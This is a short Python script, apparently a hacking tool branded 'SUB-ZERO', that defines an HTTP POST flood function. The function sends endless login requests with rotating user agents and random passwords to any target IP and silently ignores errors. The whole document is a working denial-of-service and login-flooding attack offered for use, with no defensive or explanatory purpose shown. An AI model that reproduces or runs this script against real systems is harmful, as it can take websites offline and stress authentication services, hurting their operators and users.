import random
import requests
'''
        ███████╗██╗   ██╗██████╗      ███████╗███████╗██████╗  ██████╗     
        ██╔════╝██║   ██║██╔══██╗     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    
        ███████╗██║   ██║██████╔╝█████╗ ███╔╝ █████╗  ██████╔╝██║   ██║    
        ╚════██║██║   ██║██╔══██╗╚════╝███╔╝  ██╔══╝  ██╔══██╗██║   ██║    
        ███████║╚██████╔╝██████╔╝     ███████╗███████╗██║  ██║╚██████╔╝    
        ╚══════╝ ╚═════╝ ╚═════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     
                                                                                                                                                                       

'''

def http_post_flood(target_ip):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(["Mozilla/5.0", "Chrome/91.0", "Safari/537.36"]),
                "Content-Type": "application/x-www-form-urlencoded"
            }
            data = f"username=test&password={random.randint(1, 100000)}"
            requests.post(f"http://{target_ip}/login", headers=headers, data=data)
        except:
            pass
